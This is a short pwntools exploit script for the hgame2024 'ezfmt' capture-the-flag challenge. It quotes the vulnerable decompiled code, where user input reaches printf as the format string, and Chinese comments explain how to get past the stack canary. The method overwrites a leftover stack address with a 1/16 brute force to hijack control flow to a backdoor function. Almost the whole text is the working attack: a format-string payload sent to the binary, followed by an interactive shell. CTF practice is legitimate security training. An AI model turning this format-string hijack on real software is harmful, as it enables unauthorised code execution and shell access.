'''
// hgame2024 ezfmt string https://chenxi9981.github.io/hgame2024_week1/
  strcpy((char *)buf, "make strings and getshell\n");
  write(0, buf, 0x1BuLL);
  read(0, s, 0x50uLL);
  if ( !strchr(s, 112) && !strchr(s, 115) )
    printf(s);
'''
# old ebp在第18个位置，修改这个地址，然后在栈里面写入sys的地址。
# 这个题不能泄漏stack地址并且开启了canary保护，这样就需要利残留在stack上的地址，
## 通过修改残留的栈地址并且1/16的爆破从成功劫持程序流到后⻔函数

from pwn import *
context.arch = "amd64"
context.log_level = "debug"

p = process("./vuln")

payload = "%88c%18$hhn%4198885c%22$ln"
# payload2 = b'%72c%18$hhnaaaaa' + p64(0x40123D) * 6
p.sendafter(b'M3?\n', payload)

p.interactive()
